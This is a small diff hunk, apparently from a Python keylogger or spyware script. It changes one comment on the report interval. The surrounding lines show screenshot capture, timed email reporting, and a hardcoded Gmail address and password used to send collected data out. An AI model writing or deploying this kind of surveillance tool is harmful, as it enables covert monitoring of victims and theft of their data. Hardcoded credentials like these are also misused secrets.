@@ -10,7 +10,7 @@ from email.mime.multipart import MIMEMultipart
 from threading import Semaphore, Timer
 import pyscreenshot as ImageGrab #for screenshot
 
-SEND_REPORT_EVERY = 1800  # 15 minutes
+SEND_REPORT_EVERY = 1800  # 30 minutes
 EMAIL_ADDRESS = "wifipwd9@gmail.com" #Enter Email
 EMAIL_PASSWORD = "cybersec101" # Enter Password
 
